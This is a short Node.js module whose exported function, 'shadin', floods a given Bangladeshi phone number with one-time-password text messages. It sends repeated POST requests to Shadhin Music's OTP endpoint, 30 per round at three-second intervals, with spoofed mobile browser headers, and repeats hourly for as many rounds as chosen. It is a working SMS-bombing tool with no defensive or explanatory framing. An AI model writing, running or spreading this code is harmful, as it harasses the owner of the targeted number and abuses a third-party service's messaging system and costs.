const axios = require("axios");

async function shadin(number, limit) {
  for (let round = 0; round < limit; round++) {
    console.log(`▶ Round ${round + 1}/${limit} started`);

    for (let i = 0; i < 30; i++) {
      try {
        const response = await axios.post(
  'https://coreapi.shadhinmusic.com/api/v5/otp/OtpRobiReq',
  {
    'msisdn': `88${number}`,
    'servicename': 'Shadhin Music',
    'shortcode': '16235'
  },
  {
    headers: {
      'Accept-Language': 'en-US,en;q=0.9',
      'Connection': 'keep-alive',
      'Origin': 'https://shadhinmusic.com',
      'Referer': 'https://shadhinmusic.com/',
      'Sec-Fetch-Dest': 'empty',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Site': 'same-site',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
      'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
      'sec-ch-ua-mobile': '?1',
      'sec-ch-ua-platform': '"Android"'
    }
  }
);
        
        console.log(`[${i + 1}/10] shadin Sent to ${number} | Response:`, response.data);
      } catch (error) {
        console.error(`[${i + 1}/10] shadin Failed:`, error.message);
      }

      await new Promise(resolve => setTimeout(resolve, 3000));
    }

    if (round < limit - 1) {
      console.log(`⏳ Waiting 1 hours before next round...`);
      await new Promise(resolve => setTimeout(resolve, 3600000));
    }
  }

  console.log("✅ All rounds completed.");
}

module.exports = { shadin };
